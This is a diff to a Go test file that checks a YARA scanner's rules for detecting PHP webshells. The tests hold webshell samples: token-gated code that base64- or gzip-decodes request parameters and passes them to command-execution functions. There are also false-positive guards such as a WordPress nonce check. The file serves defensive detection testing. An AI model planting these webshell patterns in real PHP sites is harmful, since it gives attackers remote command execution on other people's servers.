@@ -17,26 +17,40 @@ var (
 
 func TestWebshellRequestDecodedExec_Yara(t *testing.T) {
 	s := loadRepoYaraScanner(t)
-	// px-token 404.php shell: base64(request) -> var -> command sink.
-	px := "<?php $k=\"4v9f76314qyo\";\n" +
-		"if(isset(" + gReq + "[\"px\"])&&" + gReq + "[\"px\"]===$k){\n" +
-		"$c=" + fB64 + "(" + gReq + "[\"b\"]);\n" +
-		"@" + sPass + "($c.' 2>&1');}\n"
-	if !hasYaraRule(s.ScanBytes([]byte(px)), "webshell_request_decoded_exec") {
-		t.Error("webshell_request_decoded_exec: px-token indirection shell not detected by deep scan")
+	// decode assignment whose next statement is the sink.
+	simple := "<?php $c=" + fB64 + "(" + gReq + "[\"b\"]); @" + sPass + "($c);"
+	if !hasYaraRule(s.ScanBytes([]byte(simple)), "webshell_request_decoded_exec") {
+		t.Error("webshell_request_decoded_exec: simple decode->sink not detected by deep scan")
 	}
 	nested := "<?php $x=" + fGz + "(" + fB64 + "(" + gPost + "['z'])); " + sSys + "($x);"
 	if !hasYaraRule(s.ScanBytes([]byte(nested)), "webshell_request_decoded_exec") {
 		t.Error("webshell_request_decoded_exec: nested-decoder variant not detected")
 	}
-	// FP guard: decoder on request but sink writes a file (not exec).
+	// FP guards.
 	legit := "<?php $img=" + fB64 + "(" + gPost + "['image']); file_put_contents($p,$img);"
 	if hasYaraRule(s.ScanBytes([]byte(legit)), "webshell_request_decoded_exec") {
 		t.Error("webshell_request_decoded_exec FP: decoded request written to a file")
 	}
-	// FP guard: escapeshellarg-built command with separately-handled request.
-	updraft := "<?php $cmd=escapeshellarg($this->bin); proc_open($cmd,$s,$p); if(isset(" + gPost + "['a'])){$this->run(" + gPost + "['a']);}"
-	if hasYaraRule(s.ScanBytes([]byte(updraft)), "webshell_request_decoded_exec") {
-		t.Error("webshell_request_decoded_exec FP: escapeshellarg-built command")
+	unrelated := "<?php $img=" + fB64 + "(" + gPost + "['image']); file_put_contents($p,$img); " + sSys + "($maint);"
+	if hasYaraRule(s.ScanBytes([]byte(unrelated)), "webshell_request_decoded_exec") {
+		t.Error("webshell_request_decoded_exec FP: unrelated exec after decode")
+	}
+}
+
+func TestWebshellAuthTokenGate_Yara(t *testing.T) {
+	s := loadRepoYaraScanner(t)
+	// Real px-shell: hardcoded token compared to a request param, sink after
+	// intervening statements.
+	pxFull := "<?php $k=\"4v9f76314qyo\";\n" +
+		"if(isset(" + gReq + "[\"px\"])&&" + gReq + "[\"px\"]===$k){\n$c=null;\n" +
+		"if(isset(" + gReq + "[\"b\"])){$c=" + fB64 + "(" + gReq + "[\"b\"]);}\n" +
+		"if($c!==null){ob_start();@" + sPass + "($c);}\nexit;}"
+	if !hasYaraRule(s.ScanBytes([]byte(pxFull)), "webshell_auth_token_gate") {
+		t.Error("webshell_auth_token_gate: real px-token shell not detected by deep scan")
+	}
+	// FP guard: WP nonce comparison (function result, not a hardcoded token).
+	nonce := "<?php $e = wp_create_nonce('a'); if(isset(" + gPost + "['_wpnonce']) && " + gPost + "['_wpnonce'] === $e){ ok(); }"
+	if hasYaraRule(s.ScanBytes([]byte(nonce)), "webshell_auth_token_gate") {
+		t.Error("webshell_auth_token_gate FP: WordPress nonce check")
 	}
 }
